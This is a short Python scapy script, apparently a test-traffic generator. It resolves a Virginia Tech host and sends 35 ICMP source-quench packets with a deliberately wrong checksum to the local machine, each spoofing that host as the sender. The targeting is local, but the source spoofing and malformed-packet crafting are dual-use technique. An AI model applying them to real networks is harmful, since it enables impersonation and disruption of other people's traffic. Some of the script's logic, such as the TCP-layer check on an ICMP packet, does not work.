import scapy.all as scapy
import socket
import time

sleep_time = 1

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
local_host = s.getsockname()[0]
print(local_host)


# Packet 2

source_hostname = 'violet.cirt.vt.edu'
src_host = socket.gethostbyname(source_hostname)
print(src_host)

for _ in range(35):
    packet2 = scapy.IP(src=src_host, dst=local_host)/scapy.ICMP(type=4, chksum=100)
    result2 = scapy.send(packet2, count=1, verbose=False)
    if not(result2 is None):
        if packet2.haslayer('TCP'):
            print(packet2['TCP'].payload)
    time.sleep(sleep_time)
